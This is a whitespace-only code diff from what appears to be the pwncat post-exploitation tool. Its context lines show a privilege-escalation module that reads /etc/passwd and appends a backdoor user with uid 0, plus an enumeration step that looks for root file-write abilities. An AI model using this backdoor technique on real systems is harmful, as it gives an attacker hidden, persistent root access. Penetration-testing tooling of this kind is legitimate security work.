@@ -19,7 +19,6 @@ class AppendPasswd(EscalationReplace):
         self.ability = ability
 
     def escalate(self, session: "pwncat.manager.Session"):
-
         try:
             with session.platform.open("/etc/passwd", "r") as filp:
                 passwd_contents = list(filp)
@@ -34,7 +33,6 @@ class AppendPasswd(EscalationReplace):
         backdoor_hash = crypt.crypt(backdoor_pass, crypt.METHOD_SHA512)
 
         if not any(line.startswith(f"{backdoor_user}:") for line in passwd_contents):
-
             # Add our password
             "".join(passwd_contents)
             new_line = f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}\n"""
@@ -80,7 +78,6 @@ class Module(EnumerateModule):
     PLATFORM = [Linux]
 
     def enumerate(self, session):
-
         for ability in session.run("enumerate.gather", types=["ability.file.write"]):
             if ability.uid != 0:
                 continue
